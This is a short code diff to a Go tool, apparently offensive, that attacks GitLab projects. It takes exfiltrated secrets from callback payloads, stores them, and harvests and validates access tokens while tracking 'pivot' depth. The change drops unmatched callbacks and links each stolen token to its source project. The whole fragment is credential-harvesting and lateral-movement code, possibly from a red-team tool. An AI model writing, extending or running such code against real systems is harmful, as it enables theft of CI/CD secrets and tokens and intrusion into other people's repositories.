@@ -241,7 +241,8 @@ func (o *Orchestrator) attackAndHarvest(ctx context.Context, cl *gitlabx.Client,
 		} else if i < len(attacked) {
 			target = attacked[i].target
 		} else {
-			target = attacked[0].target
+			slog.Debug("skipping unmatched callback payload", "index", i, "project", payload.Project)
+			continue
 		}
 		o.storeExfilData(payload.Secrets, target, depth)
 		harvested = append(harvested, o.harvestTokens(ctx, payload, target, depth)...)
@@ -278,6 +279,7 @@ func (o *Orchestrator) harvestTokens(ctx context.Context, payload *ExfilPayload,
 		validated.Depth = tok.Depth
 
 		o.creds.Add(validated)
+		o.creds.RecordTokenProject(validated.TokenHash, target.ProjectID)
 		o.emit(PivotEvent{Type: "credential", Depth: depth, Message: fmt.Sprintf("harvested %s token from %s (%s)", validated.TokenType, tok.SourceKey, target.Path)})
 
 		if validated.IsValid {
